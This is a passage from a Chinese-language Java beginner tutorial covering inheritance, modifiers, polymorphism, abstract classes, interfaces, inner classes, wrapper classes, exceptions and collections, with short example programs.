=red><strong>注意：子类中所有的构造方法默认都会访问父类中无参的构造方法。</strong></ront></p><p>子类会继承父类中的数据，可能还会使用父类的数据。所以，子类初始化之前，一定要先完成父类数据的初始化，原因在于，每一个子类构造方法的第一条语句默认都是：<code>super()</code>；</p><p>如果父类中没有无参构造方法，只有带参构造方法，该怎么办呢？</p><ol><li>通过使用super关键字去显示的调用父类的带参构造方法</li><li>在父类中自己提供一个无参构造方法</li></ol><p> <strong>2.4、继承中成员方法的访问特点</strong>：</p><p>通过子类对象访问一个方法</p><ol><li>子类成员范围找</li><li>父类成员范围找</li><li>如果都没有就报错(不考虑父亲的父亲…)</li></ol><p><strong>2.5、 Java中继承的注意事项</strong>：</p><ul><li>Java中类只支持单继承，不支持多继承。</li></ul><p>错误范例：<code>class A extends B, C &#123; &#125;</code></p><ul><li>Java中类支持多层继承。</li></ul><p>多层继承示例代码：</p><pre><code class="java">public class Granddad &#123;    public void drink() &#123;        System.out.println(&quot;爷爷爱喝酒&quot;);    &#125;&#125;</code></pre><pre><code class="java">public class Father extends Granddad &#123;    public void smoke() &#123;        System.out.println(&quot;爸爸爱抽烟&quot;);    &#125;&#125;</code></pre><pre><code class="java">public class Son extends Father &#123;    // 此时，Son类中就同时拥有drink方法以及smoke方法&#125;</code></pre><p> <strong>继承练习</strong>：</p><p>例： 老师和学生</p><p> 需求：定义老师类和学生类，然后写代码测试；最后找到老师类和学生类当中的共性内容，抽取出一个父类，用继承的方式改写代码，并进行测试。</p><pre><code class="java">class Person &#123;    private String name;    private int age;    public Person() &#123;    &#125;    public Person(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public int getAge() &#123;        return age;    &#125;    public void setAge(int age) &#123;        this.age = age;    &#125;&#125;</code></pre><pre><code class="java">class Teacher extends Person &#123;    public Teacher() &#123;&#125;    public Teacher(String name,int age) &#123;        super(name,age);//调用父类的有参构造    &#125;    public void teach() &#123;        System.out.println(&quot;用爱成就每一位学员&quot;);    &#125;&#125;</code></pre><pre><code class="java">class Student extends Person&#123;    public Student() &#123;&#125;    public Student(String name, int age) &#123;    super(name,age);    &#125;    public void study()&#123;        System.out.println(&quot;学生学习&quot;);    &#125;&#125;</code></pre><pre><code class="java">class PersonDemo &#123;    public static void main(String[] args)&#123;    //创建老师类对象并进行测试    Teacher t1 = new Teacher();    t1.setName(&quot;林青霞&quot;);    t1.setAge(30);    System.out.println(t1.getName() + &quot;,&quot; + t1.getAge());    t1.teach();    Teacher t2 = new Teacher(&quot;风清扬&quot;, 33);    System.out.println(t2.getName() + &quot;,&quot; + t2.getAge());    t2.teach();    // 创建学生类对象测试    Student s = new Student(&quot;张三&quot;，23)；    System.out.println(s.getName() + &quot;,&quot; + s.getAge());    s.study();    &#125;&#125;</code></pre><hr><h4 id="5、修饰符"><a href="#5、修饰符" class="headerlink" title="5、修饰符"></a>5、修饰符</h4><p><strong>1、权限修饰符</strong>:</p><p><img src="https://img-blog.csdnimg.cn/20200826191017525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br><strong>2、final</strong>：</p><p>fianl关键字的作用：</p><ul><li>final代表最终的意思，可以修饰成员方法，成员变量，类。</li></ul><p>final修饰类、方法、变量的效果：</p><ul><li>fianl修饰类：该类不能被继承（不能有子类，但是可以有父类）。</li><li>final修饰方法：该方法不能被重写。</li><li>final修饰变量：表明该变量是一个常量，不能再次赋值。</li></ul><p><strong>3、static</strong>：</p><p>static的概念：</p><ul><li>static关键字是静态的意思，可以修饰【成员方法】，【成员变量】。</li></ul><p>static修饰的特点：</p><ol><li>被类的所有对象共享，这也是我们判断是否使用静态关键字的条件。</li><li>可以通过类名调用当然，也可以通过对象名调用【推荐使用类名调用】。</li></ol><pre><code class="java">class Student &#123;    public String name; //姓名    public int age; //年龄    public static String university; //学校 共享数据！所以设计为静态！    public void show() &#123;    System.out.println(name + &quot;,&quot; + age + &quot;,&quot; + university);    &#125;&#125;public class StaticDemo &#123;    public static void main(String[] args) &#123;        // 为对象的共享数据赋值        Student.university = &quot;传智大学&quot;;        Student s1 = new Student();        s1.name = &quot;林青霞&quot;;        s1.age = 30;        s1.show();        Student s2 = new Student();        s2.name = &quot;风清扬&quot;;        s2.age = 33;        s2.show();    &#125;&#125;</code></pre><p><strong>4、static访问特点</strong>：</p><ul><li>静态成员方法只能访问静态成员【方法或变量】。<blockquote><p> <strong><font color= red>main方法是静态的。</strong></p></blockquote><hr></li></ul><h4 id="6、多态"><a href="#6、多态" class="headerlink" title="6、多态"></a>6、多态</h4><p><strong>1、什么是多态</strong>？</p><ul><li>同一个对象，在不同时刻表现出来的不同形态。</li></ul><p><strong>2、多态的前提</strong>：</p><ol><li>要有继承或实现关系</li><li>要有方法的重写</li><li>要有父类引用指向子类对象</li></ol><p><strong>3、多态中的成员访问特点</strong>：</p><p>成员变量：</p><ul><li>编译看父类，运行看父类</li></ul><p>成员方法：</p><ul><li>编译看父类，运行看子类</li></ul><p><strong>4、多态的好处和弊端</strong>：</p><p>好处：</p><ul><li>提高程序的扩展性。定义方法时候，使用父类型作为参数，在使用的时候，使用具体的子类型参与操作。</li></ul><p>弊端：</p><ul><li>不能使用子类的特有成员。</li></ul><p><strong>5、多态中的转型</strong>：</p><p>向上转型：</p><ul><li>父类引用指向子类对象</li></ul><p>向下转型：</p><ul><li>格式：子类型 对象名 = (子类型)父类引用;</li></ul><p>例：</p><ul><li>动物类：</li></ul><pre><code class="java">public class Animal &#123;    public void eat() &#123;        System.out.println(&quot;动物吃东西&quot;);    &#125;&#125;</code></pre><ul><li>猫类:</li></ul><pre><code class="java">public class Cat extends Animal &#123;    @Override    public void eat() &#123;        System.out.println(&quot;猫吃鱼&quot;);    &#125;public void playGame() &#123;    System.out.println(&quot;猫捉迷藏&quot;);    &#125;&#125;</code></pre><ul><li>测试类：</li></ul><pre><code class="java">public class AnimalDemo &#123;    public static void main(String[] args) &#123;        //多态        //向上转型        Animal a = new Cat();        a.eat();    //  a.playGame();        //向下转型        Cat c = (Cat)a;        c.eat();        c.playGame();    &#125;&#125;</code></pre><hr><h4 id="7、抽象类"><a href="#7、抽象类" class="headerlink" title="7、抽象类"></a>7、抽象类</h4><p><strong>1、抽象类的概述</strong>：</p><ul><li>当在做子类共性功能抽取时，有些方法在父类中并没有具体的体现，这个时候就需要抽象类了！</li><li>在Java中，一个没有方法体的方法应该定义为抽象方法，而类中如果有抽象方法，该类必须定义为抽象类！</li></ul><p><strong>2、抽象类的特点</strong>：</p><p>1、抽象类和抽象方法必须使用 <code>abstract</code> 关键字修饰。</p><pre><code class="java">    //抽象类的定义    public abstract class 类名 &#123;    //抽象方法的定义        public abstract void eat();&#125;</code></pre><p>2、抽象类中不一定有抽象方法，有抽象方法的类一定是抽象类。</p><p>3、抽象类不能实例化</p><ul><li>抽象类如何实例化呢？参照多态的方式，通过子类对象实例化，这叫<strong>抽象类多态</strong>。</li></ul><p>4、抽象类的子类</p><ul><li>要么重写抽象类中的<code>所有</code>抽象方法</li><li>要么是抽象类</li></ul><p><strong>3、抽象类的成员特点</strong>：</p><p>成员变量：</p><ul><li>既可以是变量</li><li>也可以是常量</li></ul><p>构造方法：</p><ul><li>空参构造</li><li>有参构造</li></ul><p>成员方法：</p><ul><li>抽象方法</li><li>普通方法<hr></li></ul><h4 id="8、接口"><a href="#8、接口" class="headerlink" title="8、接口"></a>8、接口</h4><p><strong>1、接口的概述</strong>：</p><ul><li>接口就是一种公共的规范标准，只要符合规范标准，大家都可以通用。</li><li>Java中的接口更多的体现在对行为的抽象！</li></ul><p><strong>2、接口的特点</strong>：</p><p>1、接口用关键字interface修饰</p><pre><code class="java">public interface 接口名 &#123;&#125;</code></pre><p>2、类实现接口用implements表示</p><pre><code class="java">public class 类名 implements 接口名 &#123;&#125;</code></pre><p>3、接口不能实例化</p><ul><li>接口如何实例化呢？参照多态的方式，通过实现类对象实例化，这叫<strong>接口多态</strong>。</li></ul><p>4、 多态的形式：具体类多态，抽象类多态，接口多态。</p><p>5、接口的子类</p><ul><li>要么重写接口中的所有抽象方法</li><li> 要么子类也是抽象类</li></ul><p><strong>3、抽象类的成员特点</strong>：</p><ol><li><p>成员变量：只能是常量且为静态； 默认修饰符：<code>public static final</code></p></li><li><p>构造方法：没有，因为接口主要是扩展功能的，而没有具体存在。</p></li><li><p>成员方法：只能是抽象方法。默认修饰符：<code>public abstract</code></p><hr></li></ol><h4 id="9、内部类"><a href="#9、内部类" class="headerlink" title="9、内部类"></a>9、内部类</h4><p> <strong>1、内部类的基本使用</strong>：</p><p>1.内部类概念：</p><ul><li>在一个类中定义一个类。举例：在一个类A的内部定义一个类B，类B就被称为内部类。</li></ul><p>例：</p><pre><code class="java">class Outer &#123;    public class Inner &#123;    &#125;&#125;</code></pre><p>2、内部类的访问特点：</p><ul><li>内部类可以直接访问外部类的成员，包括私有</li><li>外部类要访问内部类的成员，必须创建对象</li></ul><p>示例代码：</p><pre><code class="java">/*    内部类访问特点：        内部类可以直接访问外部类的成员，包括私有        外部类要访问内部类的成员，必须创建对象*/public class Outer &#123;    private int num = 10;    public class Inner &#123;        public void show() &#123;            System.out.println(num);        &#125;    &#125;    public void method() &#123;            Inner i = new Inner();            i.show();    &#125;&#125;</code></pre><p><strong>2、成员内部类</strong>：</p><p>1.成员内部类的定义位置：</p><ul><li>在类中方法，跟成员变量是一个位置</li></ul><p>2.外界创建成员内部类格式：</p><ul><li>格式：外部类名.内部类名 对象名 = 外部类对象.内部类对象;</li><li>举例：<code>Outer.Inner oi = new Outer().new Inner();</code></li></ul><p>3.成员内部类的推荐使用方案：</p><ul><li>将一个类，设计为内部类的目的，大多数都是不想让外界去访问，所以内部类的定义应该私有化，私有化之后，再提供一个可以让外界调用的方法，方法内部创建内部类对象并调用。</li></ul><p><strong>3、局部内部类</strong>：</p><p>1.局部内部类定义位置：</p><ul><li>局部内部类是在方法中定义的类</li></ul><p>2.局部内部类方式方式</p><ul><li>局部内部类，外界是无法直接使用，需要在方法内部创建对象并使用。</li><li>该类可以直接访问外部类的成员，也可以访问方法内的局部变量。</li></ul><p>示例代码：</p><pre><code class="java">class Outer &#123;    private int num = 10;    public void method() &#123;        int num2 = 20;        class Inner &#123;            public void show() &#123;                System.out.println(num);                System.out.println(num2);            &#125;        &#125;        Inner i = new Inner();        i.show();    &#125;&#125;</code></pre><pre><code class="java">public class OuterDemo &#123;    public static void main(String[] args) &#123;        Outer o = new Outer();        o.method();    &#125;&#125;</code></pre><p><strong>4、 匿名内部类</strong> （局部内部类的一种）：</p><p>匿名内部类的前提：</p><ul><li>存在一个类或者接口，这里的类可以是具体类也可以是抽象类。</li></ul><p>匿名内部类的格式：</p><ul><li><p>new 类名 ( ) {<br>  重写方法<br>}</p></li><li><p>new 接口名 ( ) {<br>  重写方法<br>}</p></li></ul><p>举例：</p><pre><code class="java">new Inter()&#123;    @Override    public void method()&#123;&#125;&#125;;</code></pre><p>匿名内部类的本质:</p><ul><li>本质：是一个继承了该类或者实现了该接口的子类匿名对象。</li></ul><p>匿名内部类直接调用方法:</p><p>接口：</p><pre><code class="java">interface Inter&#123;    void method();&#125;</code></pre><pre><code class="java">class Test&#123;    public static void main(String[] args)&#123;        new Inter()&#123;            @Override            public void method()&#123;                System.out.println(&quot;我是匿名内部类&quot;);            &#125;        &#125;.method(); // 直接调用方法    &#125;&#125;</code></pre><p>匿名内部类的细节:</p><ul><li>匿名内部类可以通过多态的形式接受。</li></ul><pre><code class="java">Inter i = new Inter()&#123;    @Override    public void method()&#123;    &#125;&#125;</code></pre><p>匿名内部类在开发中的使用：</p><ul><li>当发现某个方法需要，接口或抽象类的子类对象，我们就可以传递一个匿名内部类过去，来简化传统的代码</li></ul><p>示例代码：</p><p>接口：</p><pre><code class="java">interface Jumpping &#123;    void jump();&#125;</code></pre><p>实现类1：</p><pre><code class="java">class Cat implements Jumpping &#123;    @Override    public void jump() &#123;        System.out.println(&quot;猫可以跳高了&quot;);    &#125;&#125;</code></pre><p>实现类2：</p><pre><code class="java">class Dog implements Jumpping &#123;    @Override    public void jump() &#123;        System.out.println(&quot;狗可以跳高了&quot;);    &#125;&#125;</code></pre><p>操作类：</p><pre><code class="java">class JumppingOperator &#123;    public void method(Jumpping j) &#123; //new Cat(); new Dog();        j.jump();    &#125;&#125;</code></pre><p>测试类：</p><pre><code class="java">class JumppingDemo &#123;    public static void main(String[] args) &#123;        //需求：创建接口操作类的对象，调用method方法        JumppingOperator jo = new JumppingOperator();        Jumpping j = new Cat();        jo.method(j);        Jumpping j2 = new Dog();        jo.method(j2);        System.out.println(&quot;­­­­­­­­&quot;);        // 匿名内部类的简化        jo.method(new Jumpping() &#123;            @Override            public void jump() &#123;                System.out.println(&quot;猫可以跳高了&quot;);            &#125;        &#125;);        // 匿名内部类的简化        jo.method(new Jumpping() &#123;            @Override            public void jump() &#123;                System.out.println(&quot;狗可以跳高了&quot;);            &#125;        &#125;);    &#125;&#125;</code></pre><hr><h4 id="9、包装类"><a href="#9、包装类" class="headerlink" title="9、包装类"></a>9、包装类</h4><p><strong>1、基本类型包装类</strong>：</p><ul><li><p>基本类型包装类的作用：将基本数据类型封装成对象的好处在于可以在对象中定义更多的功能方法操作该数据。</p></li><li><p>常用的操作之一：用于基本数据类型与字符串之间的转换。</p></li></ul><p>基本类型对应的包装类：</p><p><img src="https://img-blog.csdnimg.cn/20200820181227350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br><strong>1.2、int和String类型的相互转换</strong>：</p><p>1、int转换为String:</p><p>转换方式：</p><ul><li>方式一：直接在数字后加一个空字符串</li><li>方式二：通过String类静态方法valueOf()</li></ul><p>例：</p><pre><code class="java">public class IntegerDemo &#123;    public static void main(String[] args) &#123;        //int --- String        int number = 100;        //方式1        String s1 = number + &quot;&quot;;        System.out.println(s1);        //方式2        //public static String valueOf(int i)        String s2 = String.valueOf(number);        System.out.println(s2);        System.out.println(&quot;--------&quot;);    &#125;&#125;</code></pre><p>2、String转换为int：</p><p>转换方式：</p><ul><li>方式一：先将字符串数字转成Integer，再调用<code>valueOf()</code>方法。</li><li>方式二：通过Integer静态方法<code>parseInt()</code>进行转换。</li></ul><p>例：</p><pre><code class="java">public class IntegerDemo &#123;    public static void main(String[] args) &#123;    //String --- int    String s = &quot;100&quot;;    //方式1：String --- Integer --- int    Integer i = Integer.valueOf(s);    //public int intValue()    int x = i.intValue();    System.out.println(x);    //方式2    //public static int parseInt(String s)    int y = Integer.parseInt(s);    System.out.println(y);    &#125;&#125;</code></pre><p><strong>3、自动拆箱和自动装箱</strong>：</p><p>自动装箱：</p><ul><li>把基本数据类型转换为对应的包装类类型</li></ul><p>自动拆箱：</p><ul><li>把包装类类型转换为对应的基本数据类型</li></ul><p>示例代码：</p><pre><code class="java">    Integer i = 100; // 自动装箱    i += 200; // i = i + 200; i + 200 自动拆箱；i = i + 200; 是自动装箱</code></pre><h4 id="10、时间日期类"><a href="#10、时间日期类" class="headerlink" title="10、时间日期类"></a>10、时间日期类</h4><p><strong>1、 SimpleDateFormat类</strong>：</p><p>SimpleDateFormat类构造方法:</p><p><img src="https://img-blog.csdnimg.cn/20200822003633751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>SimpleDateFormat类的常用方法：</p><ul><li>格式化(从Date到String)：public final String format(Date date)：将日期格式化成日期/时间字符串。</li></ul><ul><li>解析(从String到Date)：public Date parse(String source)：从给定字符串的开始解析文本以生成日期。</li></ul><p>例：</p><pre><code class="java">public class SimpleDateFormatDemo &#123;    public static void main(String[] args) throws ParseException &#123;        //格式化：从 Date 到 String        Date d = new Date();//             SimpleDateFormat sdf = new SimpleDateFormat();        SimpleDateFormat sdf = new SimpleDateFormat(&quot;yyyy年MM月dd日 HH:mm:ss&quot;);        String s = sdf.format(d);        System.out.println(s);        System.out.println(&quot;--------&quot;);        //从 String 到 Date        String ss = &quot;2048-08-09 11:11:11&quot;;        //ParseException        SimpleDateFormat sdf2 = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);        Date dd = sdf2.parse(ss);        System.out.println(dd);    &#125;&#125;</code></pre><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20200822004554286.png#pic_center"></p><hr><h4 id="11、异常"><a href="#11、异常" class="headerlink" title="11、异常"></a>11、异常</h4><p><strong>1、异常</strong>：</p><p>异常的概述：</p><ul><li>异常就是程序出现了不正常的情况。</li></ul><p>异常的体系结构：<br>                         <img src="https://img-blog.csdnimg.cn/20200822150419747.png"><br>Error ：严重问题，不需要处理。</p><p>Exception：称为异常类，它表示程序本身可以处理的问题。</p><ul><li>RuntimeException：在编译期是不检查的，出现问题后，需要我们回来修改代码。</li><li>非RuntimeException：编译期就必须处理的，否则程序不能通过编译，就更不能正常运行了。</li></ul><p><strong>2、Throwable成员方法</strong>:</p><p>常用方法：</p><p><img src="https://img-blog.csdnimg.cn/20200822232918326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>例：</p><pre><code class="java">public class ExceptionDemo02 &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;开始&quot;);        method();        System.out.println(&quot;结束&quot;);    &#125;    public static void method() &#123;        try &#123;        int[] arr = &#123;1, 2, 3&#125;;        System.out.println(arr[3]); //new ArrayIndexOutOfBoundsException();        System.out.println(&quot;这里能够访问到吗&quot;);        &#125; catch (ArrayIndexOutOfBoundsException e) &#123; //new ArrayIndexOutOfBoundsException();        //public String getMessage():返回此 throwable 的详细消息字符串//           System.out.println(e.getMessage());        //Index 3 out of bounds for length 3        //public String toString():返回此可抛出的简短描述//           System.out.println(e.toString());        //java.lang.ArrayIndexOutOfBoundsException: Index 3 out of bounds for length 3        //public void printStackTrace():把异常的错误信息输出在控制台：        e.printStackTrace();//         java.lang.ArrayIndexOutOfBoundsException: Index 3 out of boundsfor length 3//         at com.itheima_02.ExceptionDemo02.method(ExceptionDemo02.java:18)//         at com.itheima_02.ExceptionDemo02.main(ExceptionDemo02.java:11)        &#125;    &#125;&#125;</code></pre><p><strong>3、编译时异常和运行时异常的区别</strong>：</p><p>编译时异常：</p><ul><li>都是Exception类及其子类</li><li>必须显示处理，否则程序就会发生错误，无法通过编译</li></ul><p>运行时异常：</p><ul><li>都是RuntimeException类及其子类</li><li>无需显示处理，也可以和编译时异常一样处理</li></ul><p><strong>4、throws方式处理异常</strong>：</p><p>格式：</p><pre><code class="java">    public void 方法() throws 异常类名 &#123;    &#125;</code></pre><p>注意事项：</p><ol><li>throws格式是跟在方法的括号后面的。</li><li>编译时异常必须要进行处理，两种处理方案：try…catch …或者 throws，如果采用 throws 这种方案，<strong>将来谁调用谁处理</strong>。</li><li>运行时异常可以不处理，出现问题后，需要我们回来修改代码。</li></ol><p>示例代码：</p><pre><code class="java">public class ExceptionDemo &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;开始&quot;);//             method();        try &#123;    //谁调用谁处理            method2();        &#125;catch (ParseException e) &#123;            e.printStackTrace();        &#125;        System.out.println(&quot;结束&quot;);    &#125;    //编译时异常    public static void method2() throws ParseException &#123;        String s = &quot;2048-08-09&quot;;        SimpleDateFormat sdf = new SimpleDateFormat(&quot;yyyy-MM-dd&quot;);        Date d = sdf.parse(s);        System.out.println(d);&#125;    //运行时异常 可抛可不抛    public static void method() throws ArrayIndexOutOfBoundsException &#123;        int[] arr = &#123;1, 2, 3&#125;;        System.out.println(arr[3]);    &#125;&#125;</code></pre><p><strong>5、自定义异常</strong>：</p><p>例：</p><ul><li><p>自定义异常类：</p><pre><code class="java">public class ScoreException extends Exception &#123;  public ScoreException() &#123;&#125;  public ScoreException(String message) &#123;      super(message);  &#125;</code></pre></li></ul><p>}</p><pre><code>- 老师类：```javapublic class Teacher &#123;    public void checkScore(int score) throws ScoreException &#123;        if(score&lt;0 || score&gt;100) &#123;//             throw new ScoreException();        throw new ScoreException(&quot;你给的分数有误，分数应该在0-100之间&quot;);    &#125; else &#123;        System.out.println(&quot;成绩正常&quot;);        &#125;    &#125;&#125;</code></pre><ul><li>测试类：</li></ul><pre><code class="java">public class Demo &#123;    public static void main(String[] args) &#123;        Scanner sc = new Scanner(System.in);        System.out.println(&quot;请输入分数：&quot;);        int score = sc.nextInt();        Teacher t = new Teacher();        try &#123;            t.checkScore(score);        &#125; catch (ScoreException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><h4 id="12、Collection集合"><a href="#12、Collection集合" class="headerlink" title="12、Collection集合"></a>12、Collection集合</h4><p><strong>1、集合体系结构</strong>：</p><p>集合类的特点：</p><ul><li>提供一种存储空间可变的存储模型，存储的数据容量可以随时发生改变</li></ul><p>集合类的体系图：</p><p><img src="https://img-blog.csdnimg.cn/20200824000931288.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><p>其中：</p><ul><li>List 为<strong>有序可重复</strong>的，</li><li>Set 为<strong>无序不可重复</strong>的。</li></ul><p><strong>2、Collection集合概述和基本使用</strong>：</p><p>Collection集合概述：</p><ul><li>是单例集合的顶层接口，它表示一组对象，这些对象也称为Collection的元素。</li><li>JDK 不提供此接口的任何直接实现，它提供更具体的子接口（如Set和List）实现。</li></ul><p>Collection集合的常用方法：<br><img src="https://img-blog.csdnimg.cn/20200824092217259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>Collection集合基本使用：</p><pre><code class="java">public class CollectionDemo01 &#123;    public static void main(String[] args) &#123;        //创建Collection集合的对象        Collection&lt;String&gt; c = new ArrayList&lt;String&gt;();        //添加元素：boolean add(E e)        c.add(&quot;hello&quot;);        c.add(&quot;world&quot;);        c.add(&quot;java&quot;);        //输出集合对象        System.out.println(c);    &#125;&#125;</code></pre><p>运行结果：</p><p><img src="https://img-blog.csdnimg.cn/20200824092623241.png#pic_center"><br>其中ArrayList重写了<code>toString</code>方法，直接输出了集合添加的内容。</p><p><strong>3、Collection集合的遍历</strong>：</p><p>lterator：迭代器，集合的专用遍历方式</p><ul><li><code>Iterator &lt;E&gt; iterator()</code>：返回此集合中元素的迭代器，通过集合的<code>iterator()</code>方法得到</li><li>迭代器是通过集合的<code>iterator()</code>方法得到的，所以我们说它是依赖于集合而存在的</li></ul><p>lterator中的常用方法：</p><ul><li>E next()：返回迭代中的下一个元素</li><li>boolean hasNext()：如果迭代具有更多元素，则返回true</li></ul><p>示例代码：</p><pre><code class="java">public class IteratorDemo &#123;    public static void main(String[] args) &#123;        //创建集合对象        Collection&lt;String&gt; c = new ArrayList&lt;&gt;();        //添加元素        c.add(&quot;hello&quot;);        c.add(&quot;world&quot;);        c.add(&quot;java&quot;);        c.add(&quot;javaee&quot;);        //Iterator&lt;E&gt; iterator()：返回此集合中元素的迭代器，通过集合的iterator()方法得到        Iterator&lt;String&gt; it = c.iterator();        //用while循环改进元素的判断和获取        while (it.hasNext()) &#123;            String s = it.next();            System.out.println(s);        &#125;    &#125;&#125;</code></pre><p>输出结果：<br><img src="https://img-blog.csdnimg.cn/202008242236483.png"></p><h4 id="13、List集合"><a href="#13、List集合" class="headerlink" title="13、List集合"></a>13、List集合</h4><p><strong>1、List集合概述和特点</strong>：</p><p>List集合概述：</p><ul><li>有序集合(也称为序列)，用户可以精确控制列表中每个元素的插入位置。用户可以通过整数索引访问元素，并搜索列表中的元素。</li><li>与Set集合不同，列表通常允许重复的元素。</li></ul><p>List集合特点：</p><ol><li>有索引</li><li>可以存储重复元素</li><li>元素存取有序</li></ol><p><strong>2、List集合的特有方法</strong>：</p><p><img src="https://img-blog.csdnimg.cn/2020082610354832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br><strong>3、并发修改异常</strong>：</p><p>出现的原因：</p><ul><li>迭代器遍历的过程中，通过集合对象修改了集合中的元素，造成了迭代器获取元素中判断预期修改值和实际修改值不一致，则会出现：ConcurrentModificationException</li></ul><p>解决的方案：</p><ul><li>用for循环遍历，然后用集合对象做对应的操作即可。</li></ul><p>示例代码：</p><pre><code class="java">public class ListDemo &#123;    public static void main(String[] args) &#123;        //创建集合对象        List&lt;String&gt; list = new ArrayList&lt;String&gt;();        //添加元素        list.add(&quot;hello&quot;);        list.add(&quot;world&quot;);        list.add(&quot;java&quot;);        //遍历集合，得到每一个元素，看有没有&quot;world&quot;这个元素，如果有，我就添加一个&quot;javaee&quot;元素，请写代码实现//         Iterator&lt;String&gt; it = list.iterator();//         while (it.hasNext()) &#123;//             String s = it.next();//             if(s.equals(&quot;world&quot;)) &#123;//                 list.add(&quot;javaee&quot;);//             &#125;//         &#125;        for(int i=0; i&lt;list.size(); i++) &#123;            String s = list.get(i);            if(s.equals(&quot;world&quot;)) &#123;            list.add(&quot;javaee&quot;);            &#125;        &#125;        //输出集合对象        System.out.println(list);    &#125;&#125;</code></pre><p><strong>4、列表迭代器</strong>：</p><p>ListIterator介绍：</p><ul><li><p>通过List集合的<code>listIterator()</code>方法得到，所以说它是List集合特有的迭代器。</p></li><li><p>用于<strong>允许</strong>程序员沿任一方向遍历的列表迭代器，在迭代期间修改列表，并获取列表中迭代器的当前位置。</p><p>示例代码：</p></li></ul><pre><code class="java">public class ListIteratorDemo &#123;    public static void main(String[] args) &#123;        //创建集合对象        List&lt;String&gt; list = new ArrayList&lt;String&gt;();        //添加元素        list.add(&quot;hello&quot;);        list.add(&quot;world&quot;);        list.add(&quot;java&quot;);        //获取列表迭代器        ListIterator&lt;String&gt; lit = list.listIterator();        while (lit.hasNext()) &#123;            String s = lit.next();            if(s.equals(&quot;world&quot;)) &#123;                lit.add(&quot;javaee&quot;);            &#125;        &#125;        System.out.println(list);    &#125;&#125;</code></pre><p><strong>5、增强for循环</strong>：</p><p>增强for目的：简化数组和Collection集合的遍历</p><ul><li>实现lterable接口的类允许其对象成为增强型for语句的目标。</li><li>它是JDK5之后出现的，其内部原理是一个lterator迭代器。</li></ul><p>格式：</p><pre><code class="java">    for(元素数据类型 变量名 : 数组/集合对象名) &#123;        循环体;    &#125;</code></pre><p>示例代码：</p><pre><code class="java">public class ForDemo &#123;    public static void main(String[] args) &#123;        int[] arr = &#123;1,2,3,4,5&#125;;        for(int i : arr) &#123;            System.out.println(i);        &#125;        System.out.println(&quot;--------&quot;);        String[] strArray = &#123;&quot;hello&quot;,&quot;world&quot;,&quot;java&quot;&#125;;        for(String s : strArray) &#123;        System.out.println(s);        &#125;        System.out.println(&quot;--------&quot;);        List&lt;String&gt; list = new ArrayList&lt;String&gt;();        list.add(&quot;hello&quot;);        list.add(&quot;world&quot;);        list.add(&quot;java&quot;);        for(String s : list) &#123;        System.out.println(s);        &#125;        System.out.println(&quot;--------&quot;);        //内部原理是一个Iterator迭代器        /*        for(String s : list) &#123;        if(s.equals(&quot;world&quot;)) &#123;        list.add(&quot;javaee&quot;); //ConcurrentModificationException        &#125;        &#125;        */    &#125;&#125;</code></pre><hr><h4 id="14、List集合的实现类"><a href="#14、List集合的实现类" class="headerlink" title="14、List集合的实现类"></a>14、List集合的实现类</h4><p><strong>1、数据结构之数组和链表</strong>：</p><p>数组结构：</p><ul><li>查询快、增删慢</li></ul><p>队列结构</p><ul><li>查询慢、增删快</li></ul><p><strong>2、List集合子类的特点</strong>：</p><p>List集合常用子类:ArrayList，LinkedList</p><ul><li>ArrayList：底层数据结构是数组，查询快，增删慢</li><li>LinkedList：底层数据结构是链表，查询慢，增删快</li></ul><p><strong>3、LinkedList集合的特有功能</strong>：</p><p>特有方法：</p><p><img src="https://img-blog.csdnimg.cn/20200827231822328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><hr><h4 id="15、Set集合"><a href="#15、Set集合" class="headerlink" title="15、Set集合"></a>15、Set集合</h4><p><strong>1、Set集合特点</strong>：</p><ul><li>不包含重复元素的集合</li><li>没有带索引的方法，所以不能使用普通for循环遍历</li></ul><p><strong>2、哈希值</strong>：</p><p>哈希值简介：</p><ul><li>是JDK根据对象的地址或者字符串或者数字算出来的<strong>int类型</strong>的数值。</li></ul><p>如何获取哈希值：</p><ul><li>Object类中的<code>public int 